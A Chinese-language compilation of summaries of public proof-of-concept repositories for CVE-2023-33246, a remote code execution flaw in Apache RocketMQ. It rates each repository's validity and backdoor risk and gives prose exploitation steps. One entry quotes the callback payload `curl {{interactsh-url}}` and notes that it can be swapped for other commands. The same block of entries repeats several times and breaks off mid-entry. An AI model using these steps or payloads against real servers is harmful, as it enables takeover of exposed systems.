**来源**: [CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md](../2023/CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和Controller组件暴露在公网上，且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。受影响的版本是5.1.0及以下。攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能执行命令：** 由于RocketMQ的某些组件（如NameServer、Broker和Controller）暴露在公网上，并且缺乏适当的权限验证，攻击者可以利用更新配置的功能，注入恶意配置，从而以运行RocketMQ的系统用户身份执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者也可以通过构造恶意的RocketMQ协议内容来达到相同的效果。

**有效性：**

根据漏洞库信息和搜索引擎结果，此漏洞被广泛认为是可以被利用的。CISA的已知被利用漏洞目录（KEV）中也包含了此漏洞，表明该漏洞已被积极利用。
提供的 Dockerfile 文件，显示这是一个使用Go语言编写的漏洞利用程序。它编译代码并将其作为容器的入口点执行。存在两个公开可用的exp库(https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT, https://github.com/jakabakos/CVE-2023-33246_Apache_RocketMQ_RCE )证明了漏洞的可利用性

**投毒风险：**

提供的代码片段主要是Dockerfile和License。Dockerfile描述了如何构建和运行exploit程序，但是没有直接体现exploit的具体行为。因此，需要分析exploit代码的具体逻辑才能判断是否存在投毒代码。考虑到只是构建过程，本身没有明显的投毒迹象。但是，由于最终的exploit二进制文件来自于构建过程，如果构建过程中存在恶意篡改，则可能存在投毒风险。所以投毒的风险为低。例如，可能存在在编译过程中下载其他恶意库并链接，或者直接修改编译后的二进制文件。

**利用方式：**

1.  **找到暴露在公网上的RocketMQ组件：** 首先，攻击者需要确定目标RocketMQ集群的NameServer、Broker或Controller组件是否暴露在公网上。
2.  **利用更新配置功能或伪造协议：** 攻击者可以构造恶意的请求，利用更新配置功能或者伪造RocketMQ协议内容，将恶意命令注入到目标系统中。
3.  **执行任意命令：** 成功利用漏洞后，攻击者可以以运行RocketMQ的系统用户身份执行任意命令，从而控制整个系统。

**项目地址:** [vulncheck-oss/fetch-broker-conf](https://github.com/vulncheck-oss/fetch-broker-conf)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---



---

## POC #10

**来源**: [CVE-2023-33246-SuperZero_CVE-2023-33246.md](../2023/CVE-2023-33246-SuperZero_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ NameServer, Broker, 或 Controller组件暴露在公网且无权限验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-33246是Apache RocketMQ 5.1.0及以下版本中存在的远程代码执行漏洞。根据漏洞描述，当RocketMQ的NameServer、Broker或Controller组件暴露在公网且缺乏权限验证时，攻击者可以通过更新配置功能或者伪造RocketMQ协议内容来执行任意命令，从而完全控制服务器。

**有效性：**
根据CISA KEV目录、NVD、Arctic Wolf等多个信息源，此漏洞已被积极利用，并存在公开可用的PoC代码，因此判断该漏洞的PoC代码有效。

**投毒风险：**
提供的PoC代码（从README.md文件来看）是一个Java程序，通过命令行参数指定目标IP地址和要执行的命令。 风险较低，因为如果存在后门,一般在jar包里面,而不是README.md说明文件里，用户可以使用反编译工具分析jar包。

**利用方式：**
利用方式主要有两种：

1.  **更新配置功能：** 攻击者利用RocketMQ的配置更新接口，注入恶意命令到配置项中，导致服务器执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者构造包含恶意命令的RocketMQ协议数据包，发送到目标服务器，触发远程代码执行。

总而言之，利用此漏洞需要目标服务器存在可被攻击的RocketMQ组件且未进行严格的权限控制。 搜索引擎结果显示该漏洞已被DreamBus僵尸网络利用，说明该漏洞具有较高的威胁性。

**项目地址:** [SuperZero/CVE-2023-33246](https://github.com/SuperZero/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #11

**来源**: [CVE-2023-33246-d0rb_CVE-2023-33246.md](../2023/CVE-2023-33246-d0rb_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker或Controller组件暴露在公网上，且没有进行严格的权限验证。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以利用RocketMQ的配置更新功能，在未授权的情况下执行任意命令，从而控制服务器。

**有效性：**
根据提供的PoC代码，该漏洞利用的有效性较高。该PoC通过构造恶意的配置更新请求，其中包含可以执行任意命令的payload（curl {{interactsh-url}}），然后将该请求发送到RocketMQ的服务器端口(通常是10911端口)。如果服务器存在漏洞，就会执行该命令。

**投毒风险：**
分析提供的PoC代码，未发现明显的投毒代码。PoC代码的主要功能是利用漏洞执行命令，没有发现任何额外恶意行为或后门。Payload是`curl {{interactsh-url}}`，只是用来验证漏洞是否存在，并非真正的恶意指令，所以投毒风险评估为0%。

**利用方式：**
1.  **漏洞发现：** 确认目标系统运行着存在漏洞的Apache RocketMQ版本（<= 5.1.0）。
2.  **组件确认：** 确认NameServer, Broker或Controller组件暴露在公网上且未做鉴权。
3.  **构造Payload：** 构造包含恶意命令的Payload。PoC代码中使用`curl {{interactsh-url}}`进行验证，实际利用中可以替换为其他命令。
4.  **发送请求：** 将构造好的Payload封装在配置更新请求中，发送到目标服务器的端口（通常是10911）。
5.  **执行命令：** 如果漏洞存在且利用成功，服务器将执行Payload中的恶意命令。

总而言之，此漏洞的利用方式较为简单，PoC的利用有效性较高，且PoC代码本身未发现投毒风险。

**项目地址:** [d0rb/CVE-2023-33246](https://github.com/d0rb/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #12

**来源**: [CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md](../2023/CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ 组件（NameServer, Broker, Controller）暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 允许攻击者通过利用 RocketMQ 的更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，以运行 RocketMQ 的系统用户身份。漏洞存在于 RocketMQ 5.1.0 及以下版本。

**漏洞利用方式：**

1.  **利用更新配置功能：** 攻击者可以发送恶意请求，修改 RocketMQ 的配置，从而执行任意系统命令。
2.  **伪造 RocketMQ 协议内容：**  攻击者可以构造恶意的 RocketMQ 协议数据包，诱导 RocketMQ 服务端执行恶意代码。

**POC有效性评估：**

根据漏洞描述、搜索结果（特别是GitHub链接）和CISA KEV目录信息，可以确定存在可用的POC，并且该漏洞已经被积极利用。

**投毒风险评估：**

提供的代码片段看起来是构建文件（BUILD.bazel）、构建说明(BUILDING)和贡献指南(CONTRIBUTING.md)，这些文件本身不太可能包含恶意代码。但是，漏洞的利用可能涉及修改配置文件或发送特定格式的数据包，这些恶意配置或数据包可能包含投毒代码。因此，仓库中存在作者隐藏的投毒代码的风险较低，大约为10%。 主要风险在于后续利用过程中引入恶意配置或载荷的可能性。

**项目地址:** [shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0](https://github.com/shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #13

**来源**: [CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md](../2023/CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和Controller组件暴露在公网上，且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。受影响的版本是5.1.0及以下。攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能执行命令：** 由于RocketMQ的某些组件（如NameServer、Broker和Controller）暴露在公网上，并且缺乏适当的权限验证，攻击者可以利用更新配置的功能，注入恶意配置，从而以运行RocketMQ的系统用户身份执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者也可以通过构造恶意的RocketMQ协议内容来达到相同的效果。

**有效性：**

根据漏洞库信息和搜索引擎结果，此漏洞被广泛认为是可以被利用的。CISA的已知被利用漏洞目录（KEV）中也包含了此漏洞，表明该漏洞已被积极利用。
提供的 Dockerfile 文件，显示这是一个使用Go语言编写的漏洞利用程序。它编译代码并将其作为容器的入口点执行。存在两个公开可用的exp库(https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT, https://github.com/jakabakos/CVE-2023-33246_Apache_RocketMQ_RCE )证明了漏洞的可利用性

**投毒风险：**

提供的代码片段主要是Dockerfile和License。Dockerfile描述了如何构建和运行exploit程序，但是没有直接体现exploit的具体行为。因此，需要分析exploit代码的具体逻辑才能判断是否存在投毒代码。考虑到只是构建过程，本身没有明显的投毒迹象。但是，由于最终的exploit二进制文件来自于构建过程，如果构建过程中存在恶意篡改，则可能存在投毒风险。所以投毒的风险为低。例如，可能存在在编译过程中下载其他恶意库并链接，或者直接修改编译后的二进制文件。

**利用方式：**

1.  **找到暴露在公网上的RocketMQ组件：** 首先，攻击者需要确定目标RocketMQ集群的NameServer、Broker或Controller组件是否暴露在公网上。
2.  **利用更新配置功能或伪造协议：** 攻击者可以构造恶意的请求，利用更新配置功能或者伪造RocketMQ协议内容，将恶意命令注入到目标系统中。
3.  **执行任意命令：** 成功利用漏洞后，攻击者可以以运行RocketMQ的系统用户身份执行任意命令，从而控制整个系统。

**项目地址:** [vulncheck-oss/fetch-broker-conf](https://github.com/vulncheck-oss/fetch-broker-conf)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---



---

## POC #10

**来源**: [CVE-2023-33246-SuperZero_CVE-2023-33246.md](../2023/CVE-2023-33246-SuperZero_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ NameServer, Broker, 或 Controller组件暴露在公网且无权限验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-33246是Apache RocketMQ 5.1.0及以下版本中存在的远程代码执行漏洞。根据漏洞描述，当RocketMQ的NameServer、Broker或Controller组件暴露在公网且缺乏权限验证时，攻击者可以通过更新配置功能或者伪造RocketMQ协议内容来执行任意命令，从而完全控制服务器。

**有效性：**
根据CISA KEV目录、NVD、Arctic Wolf等多个信息源，此漏洞已被积极利用，并存在公开可用的PoC代码，因此判断该漏洞的PoC代码有效。

**投毒风险：**
提供的PoC代码（从README.md文件来看）是一个Java程序，通过命令行参数指定目标IP地址和要执行的命令。 风险较低，因为如果存在后门,一般在jar包里面,而不是README.md说明文件里，用户可以使用反编译工具分析jar包。

**利用方式：**
利用方式主要有两种：

1.  **更新配置功能：** 攻击者利用RocketMQ的配置更新接口，注入恶意命令到配置项中，导致服务器执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者构造包含恶意命令的RocketMQ协议数据包，发送到目标服务器，触发远程代码执行。

总而言之，利用此漏洞需要目标服务器存在可被攻击的RocketMQ组件且未进行严格的权限控制。 搜索引擎结果显示该漏洞已被DreamBus僵尸网络利用，说明该漏洞具有较高的威胁性。

**项目地址:** [SuperZero/CVE-2023-33246](https://github.com/SuperZero/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #11

**来源**: [CVE-2023-33246-d0rb_CVE-2023-33246.md](../2023/CVE-2023-33246-d0rb_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker或Controller组件暴露在公网上，且没有进行严格的权限验证。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以利用RocketMQ的配置更新功能，在未授权的情况下执行任意命令，从而控制服务器。

**有效性：**
根据提供的PoC代码，该漏洞利用的有效性较高。该PoC通过构造恶意的配置更新请求，其中包含可以执行任意命令的payload（curl {{interactsh-url}}），然后将该请求发送到RocketMQ的服务器端口(通常是10911端口)。如果服务器存在漏洞，就会执行该命令。

**投毒风险：**
分析提供的PoC代码，未发现明显的投毒代码。PoC代码的主要功能是利用漏洞执行命令，没有发现任何额外恶意行为或后门。Payload是`curl {{interactsh-url}}`，只是用来验证漏洞是否存在，并非真正的恶意指令，所以投毒风险评估为0%。

**利用方式：**
1.  **漏洞发现：** 确认目标系统运行着存在漏洞的Apache RocketMQ版本（<= 5.1.0）。
2.  **组件确认：** 确认NameServer, Broker或Controller组件暴露在公网上且未做鉴权。
3.  **构造Payload：** 构造包含恶意命令的Payload。PoC代码中使用`curl {{interactsh-url}}`进行验证，实际利用中可以替换为其他命令。
4.  **发送请求：** 将构造好的Payload封装在配置更新请求中，发送到目标服务器的端口（通常是10911）。
5.  **执行命令：** 如果漏洞存在且利用成功，服务器将执行Payload中的恶意命令。

总而言之，此漏洞的利用方式较为简单，PoC的利用有效性较高，且PoC代码本身未发现投毒风险。

**项目地址:** [d0rb/CVE-2023-33246](https://github.com/d0rb/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #12

**来源**: [CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md](../2023/CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ 组件（NameServer, Broker, Controller）暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 允许攻击者通过利用 RocketMQ 的更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，以运行 RocketMQ 的系统用户身份。漏洞存在于 RocketMQ 5.1.0 及以下版本。

**漏洞利用方式：**

1.  **利用更新配置功能：** 攻击者可以发送恶意请求，修改 RocketMQ 的配置，从而执行任意系统命令。
2.  **伪造 RocketMQ 协议内容：**  攻击者可以构造恶意的 RocketMQ 协议数据包，诱导 RocketMQ 服务端执行恶意代码。

**POC有效性评估：**

根据漏洞描述、搜索结果（特别是GitHub链接）和CISA KEV目录信息，可以确定存在可用的POC，并且该漏洞已经被积极利用。

**投毒风险评估：**

提供的代码片段看起来是构建文件（BUILD.bazel）、构建说明(BUILDING)和贡献指南(CONTRIBUTING.md)，这些文件本身不太可能包含恶意代码。但是，漏洞的利用可能涉及修改配置文件或发送特定格式的数据包，这些恶意配置或数据包可能包含投毒代码。因此，仓库中存在作者隐藏的投毒代码的风险较低，大约为10%。 主要风险在于后续利用过程中引入恶意配置或载荷的可能性。

**项目地址:** [shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0](https://github.com/shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #13

**来源**: [CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md](../2023/CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和Controller组件暴露在公网上，且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。受影响的版本是5.1.0及以下。攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能执行命令：** 由于RocketMQ的某些组件（如NameServer、Broker和Controller）暴露在公网上，并且缺乏适当的权限验证，攻击者可以利用更新配置的功能，注入恶意配置，从而以运行RocketMQ的系统用户身份执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者也可以通过构造恶意的RocketMQ协议内容来达到相同的效果。

**有效性：**

根据漏洞库信息和搜索引擎结果，此漏洞被广泛认为是可以被利用的。CISA的已知被利用漏洞目录（KEV）中也包含了此漏洞，表明该漏洞已被积极利用。
提供的 Dockerfile 文件，显示这是一个使用Go语言编写的漏洞利用程序。它编译代码并将其作为容器的入口点执行。存在两个公开可用的exp库(https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT, https://github.com/jakabakos/CVE-2023-33246_Apache_RocketMQ_RCE )证明了漏洞的可利用性

**投毒风险：**

提供的代码片段主要是Dockerfile和License。Dockerfile描述了如何构建和运行exploit程序，但是没有直接体现exploit的具体行为。因此，需要分析exploit代码的具体逻辑才能判断是否存在投毒代码。考虑到只是构建过程，本身没有明显的投毒迹象。但是，由于最终的exploit二进制文件来自于构建过程，如果构建过程中存在恶意篡改，则可能存在投毒风险。所以投毒的风险为低。例如，可能存在在编译过程中下载其他恶意库并链接，或者直接修改编译后的二进制文件。

**利用方式：**

1.  **找到暴露在公网上的RocketMQ组件：** 首先，攻击者需要确定目标RocketMQ集群的NameServer、Broker或Controller组件是否暴露在公网上。
2.  **利用更新配置功能或伪造协议：** 攻击者可以构造恶意的请求，利用更新配置功能或者伪造RocketMQ协议内容，将恶意命令注入到目标系统中。
3.  **执行任意命令：** 成功利用漏洞后，攻击者可以以运行RocketMQ的系统用户身份执行任意命令，从而控制整个系统。

**项目地址:** [vulncheck-oss/fetch-broker-conf](https://github.com/vulncheck-oss/fetch-broker-conf)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---



---

## POC #10

**来源**: [CVE-2023-33246-SuperZero_CVE-2023-33246.md](../2023/CVE-2023-33246-SuperZero_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ NameServer, Broker, 或 Controller组件暴露在公网且无权限验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-33246是Apache RocketMQ 5.1.0及以下版本中存在的远程代码执行漏洞。根据漏洞描述，当RocketMQ的NameServer、Broker或Controller组件暴露在公网且缺乏权限验证时，攻击者可以通过更新配置功能或者伪造RocketMQ协议内容来执行任意命令，从而完全控制服务器。

**有效性：**
根据CISA KEV目录、NVD、Arctic Wolf等多个信息源，此漏洞已被积极利用，并存在公开可用的PoC代码，因此判断该漏洞的PoC代码有效。

**投毒风险：**
提供的PoC代码（从README.md文件来看）是一个Java程序，通过命令行参数指定目标IP地址和要执行的命令。 风险较低，因为如果存在后门,一般在jar包里面,而不是README.md说明文件里，用户可以使用反编译工具分析jar包。

**利用方式：**
利用方式主要有两种：

1.  **更新配置功能：** 攻击者利用RocketMQ的配置更新接口，注入恶意命令到配置项中，导致服务器执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者构造包含恶意命令的RocketMQ协议数据包，发送到目标服务器，触发远程代码执行。

总而言之，利用此漏洞需要目标服务器存在可被攻击的RocketMQ组件且未进行严格的权限控制。 搜索引擎结果显示该漏洞已被DreamBus僵尸网络利用，说明该漏洞具有较高的威胁性。

**项目地址:** [SuperZero/CVE-2023-33246](https://github.com/SuperZero/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #11

**来源**: [CVE-2023-33246-d0rb_CVE-2023-33246.md](../2023/CVE-2023-33246-d0rb_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker或Controller组件暴露在公网上，且没有进行严格的权限验证。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以利用RocketMQ的配置更新功能，在未授权的情况下执行任意命令，从而控制服务器。

**有效性：**
根据提供的PoC代码，该漏洞利用的有效性较高。该PoC通过构造恶意的配置更新请求，其中包含可以执行任意命令的payload（curl {{interactsh-url}}），然后将该请求发送到RocketMQ的服务器端口(通常是10911端口)。如果服务器存在漏洞，就会执行该命令。

**投毒风险：**
分析提供的PoC代码，未发现明显的投毒代码。PoC代码的主要功能是利用漏洞执行命令，没有发现任何额外恶意行为或后门。Payload是`curl {{interactsh-url}}`，只是用来验证漏洞是否存在，并非真正的恶意指令，所以投毒风险评估为0%。

**利用方式：**
1.  **漏洞发现：** 确认目标系统运行着存在漏洞的Apache RocketMQ版本（<= 5.1.0）。
2.  **组件确认：** 确认NameServer, Broker或Controller组件暴露在公网上且未做鉴权。
3.  **构造Payload：** 构造包含恶意命令的Payload。PoC代码中使用`curl {{interactsh-url}}`进行验证，实际利用中可以替换为其他命令。
4.  **发送请求：** 将构造好的Payload封装在配置更新请求中，发送到目标服务器的端口（通常是10911）。
5.  **执行命令：** 如果漏洞存在且利用成功，服务器将执行Payload中的恶意命令。

总而言之，此漏洞的利用方式较为简单，PoC的利用有效性较高，且PoC代码本身未发现投毒风险。

**项目地址:** [d0rb/CVE-2023-33246](https://github.com/d0rb/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #12

**来源**: [CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md](../2023/CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ 组件（NameServer, Broker, Controller）暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 允许攻击者通过利用 RocketMQ 的更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，以运行 RocketMQ 的系统用户身份。漏洞存在于 RocketMQ 5.1.0 及以下版本。

**漏洞利用方式：**

1.  **利用更新配置功能：** 攻击者可以发送恶意请求，修改 RocketMQ 的配置，从而执行任意系统命令。
2.  **伪造 RocketMQ 协议内容：**  攻击者可以构造恶意的 RocketMQ 协议数据包，诱导 RocketMQ 服务端执行恶意代码。

**POC有效性评估：**

根据漏洞描述、搜索结果（特别是GitHub链接）和CISA KEV目录信息，可以确定存在可用的POC，并且该漏洞已经被积极利用。

**投毒风险评估：**

提供的代码片段看起来是构建文件（BUILD.bazel）、构建说明(BUILDING)和贡献指南(CONTRIBUTING.md)，这些文件本身不太可能包含恶意代码。但是，漏洞的利用可能涉及修改配置文件或发送特定格式的数据包，这些恶意配置或数据包可能包含投毒代码。因此，仓库中存在作者隐藏的投毒代码的风险较低，大约为10%。 主要风险在于后续利用过程中引入恶意配置或载荷的可能性。

**项目地址:** [shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0](https://github.com/shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #13

**来源**: [CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md](../2023/CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和Controller组件暴露在公网上，且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。受影响的版本是5.1.0及以下。攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能执行命令：** 由于RocketMQ的某些组件（如NameServer、Broker和Controller）暴露在公网上，并且缺乏适当的权限验证，攻击者可以利用更新配置的功能，注入恶意配置，从而以运行RocketMQ的系统用户身份执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者也可以通过构造恶意的RocketMQ协议内容来达到相同的效果。

**有效性：**

根据漏洞库信息和搜索引擎结果，此漏洞被广泛认为是可以被利用的。CISA的已知被利用漏洞目录（KEV）中也包含了此漏洞，表明该漏洞已被积极利用。
提供的 Dockerfile 文件，显示这是一个使用Go语言编写的漏洞利用程序。它编译代码并将其作为容器的入口点执行。存在两个公开可用的exp库(https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT, https://github.com/jakabakos/CVE-2023-33246_Apache_RocketMQ_RCE )证明了漏洞的可利用性

**投毒风险：**

提供的代码片段主要是Dockerfile和License。Dockerfile描述了如何构建和运行exploit程序，但是没有直接体现exploit的具体行为。因此，需要分析exploit代码的具体逻辑才能判断是否存在投毒代码。考虑到只是构建过程，本身没有明显的投毒迹象。但是，由于最终的exploit二进制文件来自于构建过程，如果构建过程中存在恶意篡改，则可能存在投毒风险。所以投毒的风险为低。例如，可能存在在编译过程中下载其他恶意库并链接，或者直接修改编译后的二进制文件。

**利用方式：**

1.  **找到暴露在公网上的RocketMQ组件：** 首先，攻击者需要确定目标RocketMQ集群的NameServer、Broker或Controller组件是否暴露在公网上。
2.  **利用更新配置功能或伪造协议：** 攻击者可以构造恶意的请求，利用更新配置功能或者伪造RocketMQ协议内容，将恶意命令注入到目标系统中。
3.  **执行任意命令：** 成功利用漏洞后，攻击者可以以运行RocketMQ的系统用户身份执行任意命令，从而控制整个系统。

**项目地址:** [vulncheck-oss/fetch-broker-conf](https://github.com/vulncheck-oss/fetch-broker-conf)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---



---

## POC #10

**来源**: [CVE-2023-33246-SuperZero_CVE-2023-33246.md](../2023/CVE-2023-33246-SuperZero_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ NameServer, Broker, 或 Controller组件暴露在公网且无权限验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-33246是Apache RocketMQ 5.1.0及以下版本中存在的远程代码执行漏洞。根据漏洞描述，当RocketMQ的NameServer、Broker或Controller组件暴露在公网且缺乏权限验证时，攻击者可以通过更新配置功能或者伪造RocketMQ协议内容来执行任意命令，从而完全控制服务器。

**有效性：**
根据CISA KEV目录、NVD、Arctic Wolf等多个信息源，此漏洞已被积极利用，并存在公开可用的PoC代码，因此判断该漏洞的PoC代码有效。

**投毒风险：**
提供的PoC代码（从README.md文件来看）是一个Java程序，通过命令行参数指定目标IP地址和要执行的命令。 风险较低，因为如果存在后门,一般在jar包里面,而不是README.md说明文件里，用户可以使用反编译工具分析jar包。

**利用方式：**
利用方式主要有两种：

1.  **更新配置功能：** 攻击者利用RocketMQ的配置更新接口，注入恶意命令到配置项中，导致服务器执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者构造包含恶意命令的RocketMQ协议数据包，发送到目标服务器，触发远程代码执行。

